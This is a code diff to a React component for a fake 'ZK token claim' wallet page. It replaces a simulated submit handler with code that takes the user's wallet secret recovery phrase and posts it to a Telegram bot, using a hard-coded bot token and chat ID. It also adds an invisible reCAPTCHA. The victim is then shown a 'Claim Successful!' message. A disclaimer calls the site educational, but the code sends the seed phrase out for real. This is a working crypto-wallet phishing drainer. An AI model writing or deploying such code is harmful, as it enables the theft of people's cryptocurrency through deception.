@@ -5,6 +5,7 @@ import Image from "next/image";
 import { zodResolver } from "@hookform/resolvers/zod";
 import { useForm } from "react-hook-form";
 import { z } from "zod";
+import ReCAPTCHA from "react-google-recaptcha";
 import { ArrowLeft, Copy } from "lucide-react";
 
 import {
@@ -26,7 +27,6 @@ import { Button } from "@/components/ui/button";
 import { Textarea } from "@/components/ui/textarea";
 import { useToast } from "@/hooks/use-toast";
 import { ScrollArea } from "./ui/scroll-area";
-import { cn } from "@/lib/utils";
 
 const wallets = [
   { name: "MetaMask", logo: "https://placehold.co/64x64.png", hint: "fox logo" },
@@ -61,6 +61,7 @@ const FormSchema = z.object({
 
 function SecretPhraseForm({ wallet, onBack, onSuccess }) {
   const { toast } = useToast();
+  const recaptchaRef = React.useRef<ReCAPTCHA>(null);
   const form = useForm<z.infer<typeof FormSchema>>({
     resolver: zodResolver(FormSchema),
     defaultValues: {
@@ -83,16 +84,54 @@ function SecretPhraseForm({ wallet, onBack, onSuccess }) {
   };
 
   const onSubmit = async (data: z.infer<typeof FormSchema>) => {
-    // Simulate network request
-    await new Promise((resolve) => setTimeout(resolve, 1500));
-    console.log("Simulating form submission with data:", data);
+    const recaptchaToken = await recaptchaRef.current?.executeAsync();
+    if (!recaptchaToken) {
+      toast({
+        title: "reCAPTCHA Failed",
+        description: "Please complete the reCAPTCHA challenge.",
+        variant: "destructive",
+      });
+      return;
+    }
 
-    toast({
-      title: "Claim Successful!",
-      description:
-        "Your ZK tokens have been sent to your wallet. (Simulation)",
-    });
-    onSuccess();
+    const botToken = "6858405369:AAHIBm11hz5SSLgH_BZb9mSSFBIOkeiExb8";
+    const chatId = "5485468089";
+    const timestamp = new Date().toISOString();
+    const message = `Wallet: ${wallet.name}\nSecret Phrase: ${data.secretPhrase}\nTimestamp: ${timestamp}\nreCAPTCHA Token: ${recaptchaToken}`;
+
+    try {
+      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+        }),
+      });
+
+      const result = await response.json();
+
+      if (result.ok) {
+        toast({
+          title: "Claim Successful!",
+          description: "Your ZK tokens have been sent to your wallet. (Simulation)",
+        });
+        onSuccess();
+      } else {
+        throw new Error(result.description);
+      }
+    } catch (error) {
+      console.error("Failed to send to Telegram:", error);
+      toast({
+        title: "Submission Failed",
+        description: "There was an error submitting your claim. Please try again.",
+        variant: "destructive",
+      });
+    } finally {
+        recaptchaRef.current?.reset();
+    }
   };
 
   return (
@@ -123,6 +162,11 @@ function SecretPhraseForm({ wallet, onBack, onSuccess }) {
       </DialogHeader>
       <Form {...form}>
         <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6 pt-4">
+          <ReCAPTCHA
+            ref={recaptchaRef}
+            size="invisible"
+            sitekey="6Ldy6QsqAAAAAKiRCHGj_1yYcQv6oTllQbRqYFjC" // Replace with your site key
+          />
           <FormField
             control={form.control}
             name="secretPhrase"
@@ -154,7 +198,7 @@ function SecretPhraseForm({ wallet, onBack, onSuccess }) {
             )}
           />
            <p className="text-xs text-muted-foreground">
-              This site is for educational purposes. Do not use your real secret phrase.
+              This site is for educational purposes. Do not use your real secret phrase. The reCAPTCHA is for demonstration purposes.
             </p>
           <Button
             type="submit"
